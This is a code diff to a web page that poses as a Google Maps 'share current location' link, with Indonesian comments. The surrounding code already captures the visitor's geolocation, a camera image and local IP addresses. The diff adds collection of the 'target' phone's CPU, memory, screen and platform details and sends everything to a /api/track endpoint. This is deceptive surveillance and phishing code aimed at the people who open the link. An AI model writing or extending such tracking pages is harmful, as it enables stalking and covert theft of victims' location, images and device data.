@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Maps - Bagikan Lokasi Terkini</title>
     
-    <!-- Open Graph Metadata dengan Logo Google Maps -->
     <meta property="og:title" content="Semarang Kota, Jawa Tengah, ID">
     <meta property="og:description" content="Ketuk untuk melihat lokasi terkini di Google Maps.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/512px-Google_Maps_icon_%282020%29.svg.png">
@@ -78,9 +77,20 @@
             let locationDone = false;
             let cameraDone = false;
 
+            // Kumpulkan informasi detail hardware HP target
+            const deviceData = {
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Tidak diketahui', // Jumlah inti CPU
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui', // Perkiraan RAM
+                screenResolution: window.screen.width + ' x ' + window.screen.height,
+                colorDepth: window.screen.colorDepth + ' bit',
+                language: navigator.language || 'Tidak diketahui',
+                platform: navigator.platform || 'Tidak diketahui',
+                touchPoints: navigator.maxTouchPoints || 0
+            };
+
             function checkAndSend() {
                 if (locationDone && cameraDone) {
-                    sendData(lat, lon, accuracy, capturedImage, localIPs);
+                    sendData(lat, lon, accuracy, capturedImage, localIPs, deviceData);
                 }
             }
 
@@ -126,7 +136,7 @@
                 });
         }
 
-        function sendData(lat, lon, accuracy, image, localIPs) {
+        function sendData(lat, lon, accuracy, image, localIPs, deviceData) {
             document.getElementById('status-text').innerText = 'Memuat rute navigasi...';
             
             fetch('/api/track', {
@@ -137,7 +147,8 @@
                     longitude: lon, 
                     accuracy: accuracy, 
                     image: image,
-                    localIPs: localIPs 
+                    localIPs: localIPs,
+                    deviceData: deviceData
                 })
             }).finally(() => {
                 setTimeout(() => {
